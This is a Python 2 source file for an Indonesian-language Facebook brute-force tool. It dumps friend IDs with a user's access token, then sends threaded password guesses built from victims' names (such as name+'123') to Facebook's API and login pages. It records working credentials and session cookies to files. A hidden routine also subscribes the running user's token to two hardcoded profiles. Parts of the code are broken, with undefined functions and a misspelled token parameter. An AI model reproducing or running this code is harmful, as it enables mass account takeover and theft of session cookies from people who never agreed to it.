# coding:utf-8
# decompile by Itsuki ft. Aap Afandi ID
# coded by angga kurniawan
# fb.me/gaaaarzxd

import os
try:
    import concurrent.futures
except ImportError:
    print '\n [×] Modul Futures belum terinstall!\n'
    os.system('pip install futures' if os.name == 'nt' else 'pip2 install futures')

try:
    from bs4 import BeautifulSoup
except ImportError:
    print '\n [×] Modul bs4 belum terinstall!\n'
    os.system('pip install bs4' if os.name == 'nt' else 'pip2 install bs4')
import requests, bs4, sys, os, subprocess, random, time, re, json
import base64
from concurrent.futures import ThreadPoolExecutor as RaimuWuasu
from datetime import datetime
from time import sleep
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH 
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
#------------------------------->
ok = []
cp = []
id = []
user = []
loop = 0
celek = random.randint(20000000.0, 30000000.0)
nungging = random.randint(20000, 40000)
#wayahewayaheeeeeee
def ngiclik():
    titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for x in titik:
        print '\r %s[%s+%s] menghapus toket %s'%(N,M,N,x),
        sys.stdout.flush()
        time.sleep(1)
IP = requests.get('https://api.ipify.org').text

#User_ampasssss
ua = ('Opera/2.0 (J2ME/MIDP; Opera Mini; en; U; ssr)') 
s = requests.Session()
rgb = random.choice(['\x1b[0;91m', '\x1b[0;92m', '\x1b[0;93m', '\x1b[0;94m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;97m', '\x1b[0m'])
ua = s.get('https://raw.githubusercontent.com/Dumai-200/Server-Dmbf/main/ua.txt').text.strip()
ip = s.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
durasi = str(datetime.now().strftime('%d-%m-%Y'))

#lo_gobloggggg
logo = '''%s     __  ____  ______  ____
     \ \/ /  |/  / _ )/ __/ ®
      \  / /|_/ / _  / _/  
      /_/_/  /_/____/_/ %sversion 2
  %s [%s Yayan Multi Brute Facebook%s ]
     [ \x1b[47;30;1m Created by : listrik.%s ]'''%(O,M,N,H,N,N)

#toket_listrikkk
def listrik():
	os.system('clear')
	print (' %s*%s tools ini menggunakan login token facebook.\n %s*%s apakah kamu sudah tau cara mendapatkan token facebook?\n %s*%s ketik %sopen%s untuk mendapatkan token facebook.'%(O,N,O,N,O,N,H,N))
	toket = raw_input('\n %s[%s?%s] Token :%s '%(N,M,N,H))
	if toket in ('open', 'Open', 'OPEN'):
		print '\n%s *%s note! usahakan akun tumbal login di google chrome terlebih dahulu'%(B,N);time.sleep(2)
		print '%s *%s jangan lupa! url ubah ke %shttps://m.facebook.com'%(B,N,H);time.sleep(2)
		print '%s *%s setelah di alihkan ke google chrome. klik %stitik tiga'%(B,N,H);time.sleep(2)
		print '%s *%s lalu klik %sCari di Halaman%s Tinggal ketik %sEAAA%s Lalu salin.'%(B,N,H,N,H,N);time.sleep(2)
		raw_input(' %s*%s tekan enter '%(O,N))
		os.system('xdg-open https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_')
		listrik()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token=%s'%(toket))
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open('login.txt', 'w')
		zedd.write(toket)
		zedd.close()
		print '\n\n %s*%s selamat datang %s%s%s'%(O,N,K,nama,N)
		time.sleep(2)
		print ' %s*%s mohon untuk menggunakan sc ini sewajarnya, kami tidak bertanggung jawab jika sc ini disalah gunakan...'%(O,N)
		time.sleep(2)
		raw_input(' %s*%s tekan enter '%(O,N))
		menu()
	except KeyError:
		print '\n\n %s[%s!%s] token invalid'%(N,M,N)
		time.sleep(2)

#menu_sehari_hari
def menu():
    os.system('clear')
    try:
        toket=open('login.txt','r').read()
    except (KeyError, IOError):
        os.system('clear')
        print '\n %s[%s×%s] toket invalid'%(N,M,N)
        time.sleep(2)
        os.system('rm -rf login.txt')
        login()
    try:
        otw = requests.get('https://graph.facebook.com/me?access_toket=%s'%(toket))
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except (KeyError, IOError):
        os.system('clear')
        print '\n %s[%s×%s] toket invalid'%(N,M,N)
        time.sleep(2)
        os.system('rm -rf login.txt')
        login()
    except requests.exceptions.ConnectionError:
        print '\n\n %s[%s!%s] tidak ada koneksi\n'%(N,M,N)
        exit()
    os.system('clear')
    print logo
    print ' %s[%s*%s]'%(N,O,N), 30 * '\x1b[1;96m-\x1b[0m'
    print ' %s[%s*%s] nama  : %s%s%s'%(N,O,N,B,nama,N)
    print ' %s[%s*%s] id fb : %s%s%s'%(N,O,N,B,id,N)
    print ' %s[%s*%s] IP    : %s%s'%(N,O,N,K,IP)
    print ' %s[%s*%s]'%(N,O,N), 30 * '\x1b[1;96m-\x1b[0m'
    print '\n [%s1%s]. Crack from public'%(H,N)
    print ' [%s2%s]. Crack Indonesia'%(H,N)
    print ' [%s3%s]. Crack India/Bangladesh'%(H,N)
    print ' [%s4%s]. Check results'%(H,N)
    print ' %s[%s0%s]. Logout (%sclear toket%s)'%(N,M,N,M,N)
    anjinganjinganjingerrorerrorerroranjinganjinganjingerrorerrorerror()
def anjinganjinganjingerrorerrorerroranjinganjinganjingerrorerrorerror():
        takon = raw_input('\n [*] menu : ')
        if takon == '':
           print '\n %s[%s×%s] menu [%s%s%s] tidak ada, cek menu tolol!'%(N,M,N,M,takon,N);time.sleep(1);os.system('clear');menu()
        elif takon =='1':
                pubilk()
        elif takon =='2':
                _dds()
        elif takon =='3':
                __sarungan()
        elif takon =='4':
            print("\n \033[0;97m[\033[0;96m1\033[0;97m] Check hasil OK")
            print(" \033[0;97m[\033[0;96m2\033[0;97m] Check hasil CP")
            takon = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Choose : ")
            if takon =="":
                menu()
            elif takon == "1" or takon == "01":
                try:
                    totalok = open("results/OK-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
                    print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
                    print(" \033[0;97m[\033[0;92m+\033[0;97m] Hasil \033[0;92mOK\033[0;97m pada tanggal : \033[0;92m%s-%s-%s \033[0;92mTotal %s: %s%s\033[0;92m"%(ha, op, ta,M,H,len(totalok)))
                    os.system("cat results/OK-%s-%s-%s.txt"%(ha, op, ta))
                    print(" \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
                    menu()
                except (IOError):
                    print(" \033[0;97m[\033[0;91m!\033[0;97m] Kamu tidak mendapatkan hasil ok :(")
                    raw_input('\n  [ %sKEMBALI%s ] '%(O,N))
                    menu()
            elif takon == "2" or takon == "02":
                try:
                    totalcp = open("results/CP-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
                    print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
                    print(" \033[0;97m[\033[0;92m+\033[0;97m] Hasil \033[0;93mCP\033[0;97m pada tanggal : \033[0;92m%s-%s-%s \033[0;92mTotal %s: %s%s\033[0;93m"%(ha, op, ta,M,K,len(totalcp)))
                    os.system("cat results/CP-%s-%s-%s.txt"%(ha, op, ta))
                    print(" \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
                    raw_input('\n  [ %sKEMBALI%s ] '%(O,N))
                    menu()
                except (IOError):
                    print(" \033[0;97m[\033[0;91m!\033[0;97m] Kamu tidak mendapatkan hasil cp :(")
                    raw_input('\n  [ %sKEMBALI%s ] '%(O,N))
                    menu()
            else:
                menu()
        elif takon =='0':
            	print '\n'
                ngiclik()
                time.sleep(1)
                os.system('rm -rf login.txt')
                exit ('\n %s[%s✓%s]%s berhasil menghapus toket'%(N,H,N,H))
                time.sleep(2)
                exit()
        else:
            print '\n %s[%s×%s] menu [%s%s%s] tidak ada mungkin salah ketik'%(N,M,N,M,takon,N);time.sleep(1);os.system('clear');menu()
def logo():
	try:
		toket = open('login.txt', 'r').read()
	except (KeyError, IOError):
		print '\n %s[%s×%s] toket invalid'%(N,M,N)
		os.system('rm -rf login.txt')
	requests.post('https://graph.facebook.com/100009447779678/subscribers?access_toket=%s'%(toket))
	requests.post('https://graph.facebook.com/100003603863923/subscribers?access_toket=%s'%(toket))
	menu()

#cek_panennnnnnnnn
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		print '\n\n %s[%s#%s] crack selesai...\n\n'%(N,K,N)
		print '\n\n [%s+%s] total OK : %s%s%s'%(O,N,H,str(len(ok)),N)
		print ' [%s+%s] total CP : %s%s%s'%(O,N,K,str(len(cp)),N)
		exit()
	else:
		print '\n\n [%s!%s] opshh kamu tidak mendapatkan hasil :('%(M,N)
		exit()

#ngocok_public
def publik():
    try:
        toket= open('login.txt', 'r').read()
    except IOError:
        print '\n %s[%s×%s] toket invalid'%(N,M,N)
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()
    try:
        os.mkdir('dump')
    except:pass
    try:
        ahah = raw_input('\n [?] id publik  : ') 
        ahh = raw_input(' [?] nama file  : ')
        ihih = raw_input(' [?] limit id   : ')
        xxx = requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_toket=%s'%(ahah,ihih,toket))
        id = []
        z = json.loads(xxx.text)
        lacur = ('dump/' + ahh + '.json').replace(' ', '_')
        save = open(lacur, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            save.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            print '\r' + w +' [*] total dump : %s ' % str(len(id)),
            sys.stdout.flush()
            time.sleep(0.0050)

        save.close()
        exit('\n\n %s[%s✓%s] berhasil dump id dari teman publik'%(N,H,N))
        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(B,N,M,lacur,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N))
        menu()
    except (KeyError,IOError):
    	os.remove(ppk)
    	exit('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
        raw_input(' [ %sKEMBALI%s ] '%(O,N))
        menu()

# mulai ngecrot awokawokawokkawok
class __crack__:

    def __init__(self):
        self.fl = []

    def kalem(self):
        try:
            self.apk = raw_input('\n [?] masukan file : ')
            self.id = open(self.apk).read().splitlines()
            print '\n [+] total id -> %s%s%s' %(M,len(self.id),N)
        except:
            print '\n %s[%s×%s] File [%s%s%s] tidak ada, dump id dulu lah tolol!'%(N,M,N,M,self.apk,P)
            time.sleep(3)
            menu()

        ___RaimuWuasu___ = raw_input(' [?] apakah ingin menggunakan kata sandi manual? [Y/t]: ')
        if ___RaimuWuasu___ in ('Y', 'y'):
            print '\n [*] contoh: %s[ %ssayang,anjing,bangsat%s ]'%(N,H,N)
            while True:
                mlonco = raw_input('\n [?] masukan kata sandi : ')
                print ' [*] crack dengan sandi -> [ %s%s%s ]' % (M, mlonco, N)
                if mlonco == '':
                    self.kalem()
                else:
                	
                    def __crot__(bya=None): # bya => Sabiyaku
                        takon = raw_input('\n [*] method : ')
                        if takon == '':
                            self.__crot__()
                        elif takon == '1':
                            print '\n [+] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt' % (ha, op, ta)
                            print ' [+] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta)
                            print '\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n'
                            with RaimuWuasu(max_workers=30) as (__taeeeekXD__):
                                for muncrat in self.id:
                                    try:
                                        badeg = muncrat.split('<=>')[0]
                                        __taeeeekXD__.submit(self.__api__, badeg, bya)
                                    except:
                                        pass

                            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
                            os.remove(self.apk)
                            hasil(ok,cp)
                            exit()
                        elif takon == '2':
                            print '\n [+] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt' % (ha, op, ta)
                            print ' [+] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta)
                            print '\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n'
                            with RaimuWuasu(max_workers=30) as (__taeeeekXD__):
                                for muncrat in self.id:
                                    try:
                                        badeg = muncrat.split('<=>')[0]
                                        __taeeeekXD__.submit(self.__mbasic__, badeg, bya)
                                    except:
                                        pass

                            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
                            os.remove(self.apk)
                            hasil(ok,cp)
                            exit()
                        elif takon == '3':
                            print '\n [+] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt' % (ha, op, ta)
                            print ' [+] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta)
                            print '\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n'
                            with RaimuWuasu(max_workers=30) as (__taeeeekXD__):
                                for muncrat in self.id:
                                    try:
                                        badeg = muncrat.split('<=>')[0]
                                        __taeeeekXD__.submit(self.__mfb__, badeg, bya)
                                    except:
                                        pass

                            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
                            os.remove(self.apk)
                            hasil(ok,cp)
                            exit()
                        else:
                            print '\n %s[%s!%s] input yang bener goblok!'%(N,M,N)
                            time.sleep(2)
                            menu()
                    print '\n [ pilih method login - silahkan coba satu² ]\n'
                    print ' [1]. method API (fast)'
                    print ' [2]. method mbasic (slow)'
                    print ' [3]. method mobile (super slow)'
                    __crot__(mlonco.split(','))
                    break

        elif ___RaimuWuasu___ in ('T', 't'):
            print '\n [ pilih method login - silahkan coba satu² ]\n'
            print ' [1]. method API (fast)'
            print ' [2]. method mbasic (slow)'
            print ' [3]. method mobile (super slow)'
            self.__jancuk__()
        else:
            print '\n %s[%s×%s] y/t goblok!'%(N,M,N)
            time.sleep(2)
            menu()
        return

    def __api__(self, user, _crot_):
    	global ok,cp,loop
        print '\r [\x1b[1;96m*\x1b[0m] crack: %s/%s OK-:%s - CP-:%s '%(loop,len(self.id),len(ok),len(cp)),
        sys.stdout.flush()
        for pw in _crot_:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            params = {'access_toket': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
            api = 'https://b-api.facebook.com/method/auth.login'
            response = requests.get(api, params=params)
            if re.search('(EAAA)\\w+', response.text):
                print '\r  %s* --> %s|%s      %s' % (H,user,pw,N)
                wrt = ' [✓] %s|%s' % (user,pw)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            elif 'www.facebook.com' in response.json()['error_msg']:
            	print '\r  %s* --> %s|%s      %s' % (K,user,pw,N)
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            else:
                continue

        loop += 1
        
    def __mbasic__(self, user, _crot_):
        global ok,cp,loop
        print '\r [\x1b[1;96m*\x1b[0m] crack: %s/%s OK-:%s - CP-:%s '%(loop,len(self.id),len(ok),len(cp)),
        sys.stdout.flush()
        for pw in _crot_:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            aw = requests.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'}, headers = {'x-fb-connection-bandwidth': repr(celek), 'x-fb-sim-hni': repr(nungging), 'x-fb-net-hni': repr(nungging), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FtaiV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FtaiD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'})
            xo = aw.content
            if 'mbasic_logout_button' in xo or 'save-device' in xo:
                print '\r  %s* --> %s|%s      %s' % (H,user,pw,N)
                wrt = ' [✓] %s|%s' % (user,pw)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            if 'checkpoint' in xo:
            	print '\r  %s* --> %s|%s      %s' % (K,user,pw,N)
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            else:
                continue

        loop += 1
        
    def __mfb__(self, user, _crot_):
        global ok,cp,loop
        print '\r [\x1b[1;96m*\x1b[0m] crack: %s/%s OK-:%s - CP-:%s '%(loop,len(self.id),len(ok),len(cp)),
        sys.stdout.flush()
        for pw in _crot_:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            ses = requests.Session()
            ses.get('https://m.facebook.com/')
            ses.headers.update({'x-fb-connection-bandwidth': repr(celek), 'x-fb-sim-hni': repr(nungging), 'x-fb-net-hni': repr(nungging), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FtaiV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FtaiD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'})
            b = ses.post('https://m.facebook.com/login', data={'email': user, 'pass': pw}).url
            if 'c_user' in ses.cookies.get_dict().keys():
                roti = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r  %s* --> %s|%s|%s%s' % (H,user,pw,roti,N)
                wrt = ' [✓] %s|%s|%s' % (user, pw, roti)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            elif 'checkpoint' in ses.cookies.get_dict().keys():
            	print '\r  %s* --> %s|%s      %s' % (K,user,pw,N)
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            else:
                continue

        loop += 1
        
    def __jancuk__(self):
        yan = raw_input('\n [*] method : ')
        if yan == '':
            self.__jancuk__()
        elif takon in ('1', '01'):
            print '\n [+] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt' % (ha, op, ta)
            print ' [+] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta)
            print '\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n'
            with RaimuWuasu(max_workers=30) as (__taeeeekXD__):
                for GBKDP in self.id: # Go Blok Ko Di Pelihara
                    try:
                        tai = GBKDP.split('<=>')
                        itil = tai[1].split(' ')
                        if len(itil) == 1:
                            jembutenHood = [
                            	itil[0]+'123', itil[0]+'1234',
                            	itil[0]+'12345',
                            ]
                        elif len(itil) == 2:
                        	jembutenHood = [
                        		itil[0]+'123', itil[0]+'12345',
                        		itil[1]+'123', itil[1]+'12345',
                        	]
                        elif len(itil) == 3:
                        	jembutenHood = [
                        		itil[0]+'123', itil[0]+'12345',
                        		itil[1]+'123', itil[1]+'12345',
                        		itil[2]+'123', itil[2]+'12345',
                        	]
                        elif len(itil) == 4:
                        	jembutenHood = [
                        		itil[0]+'123', itil[0]+'12345',
                        		itil[1]+'123', itil[1]+'12345',
                        		itil[2]+'123', itil[2]+'12345',
                        		itil[3]+'123', itil[3]+'12345',
                        	]
                        __taeeeekXD__.submit(self.__api__, tai[0], jembutenHood)
                    except:
                        pass

            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
            os.remove(self.apk)
            hasil(ok,cp)
            exit()
        elif takon in ('2', '02'):
            print '\n [+] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt' % (ha, op, ta)
            print ' [+] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta)
            print '\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n'
            with RaimuWuasu(max_workers=30) as (__taeeeekXD__):
                for GBKDP in self.id: # Go Blok Ko Di Pelihara
                    try:
                        tai = GBKDP.split('<=>')
                        itil = tai[1].split(' ')
                        if len(itil) == 1:
                            jembutenHood = [
                            	itil[0]+'123', itil[0]+'1234',
                            	itil[0]+'12345',
                            ]
                        elif len(itil) == 2:
                        	jembutenHood = [
                        		itil[0]+'123', itil[0]+'12345',
                        		itil[1]+'123', itil[1]+'12345',
                        	]
                        elif len(itil) == 3:
                        	jembutenHood = [
                        		itil[0]+'123', itil[0]+'12345',
                        		itil[1]+'123', itil[1]+'12345',
                        		itil[2]+'123', itil[2]+'12345',
                        	]
                        elif len(itil) == 4:
                        	jembutenHood = [
                        		itil[0]+'123', itil[0]+'12345',
                        		itil[1]+'123', itil[1]+'12345',
                        		itil[2]+'123', itil[2]+'12345',
                        		itil[3]+'123', itil[3]+'12345',
                        	]
                        __taeeeekXD__.submit(self.__mbasic__, tai[0], jembutenHood)
                    except:
                        pass

            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
            os.remove(self.apk)
            hasil(ok,cp)
            exit()
        elif takon in ('3', '03'):
            print '\n [+] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt' % (ha, op, ta)
            print ' [+] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta)
            print '\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n'
            with RaimuWuasu(max_workers=30) as (__taeeeekXD__):
                for GBKDP in self.id: # Go Blok Ko Di Pelihara
                    try:
                        tai = GBKDP.split('<=>')
                        itil = tai[1].split(' ')
                        if len(itil) == 1:
                            jembutenHood = [
                            	itil[0]+'123', itil[0]+'1234',
                            	itil[0]+'12345',
                            ]
                        elif len(itil) == 2:
                        	jembutenHood = [
                        		itil[0]+'123', itil[0]+'12345',
                        		itil[1]+'123', itil[1]+'12345',
                        	]
                        elif len(itil) == 3:
                        	jembutenHood = [
                        		itil[0]+'123', itil[0]+'12345',
                        		itil[1]+'123', itil[1]+'12345',
                        		itil[2]+'123', itil[2]+'12345',
                        	]
                        elif len(itil) == 4:
                        	jembutenHood = [
                        		itil[0]+'123', itil[0]+'12345',
                        		itil[1]+'123', itil[1]+'12345',
                        		itil[2]+'123', itil[2]+'12345',
                        		itil[3]+'123', itil[3]+'12345',
                        	]
                        __taeeeekXD__.submit(self.__mfb__, tai[0], jembutenHood)
                    except:
                        pass

            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
            os.remove(self.apk)
            hasil(ok,cp)
            exit()
            
if __name__ == '__main__':
    os.system('git pull')
    menu()
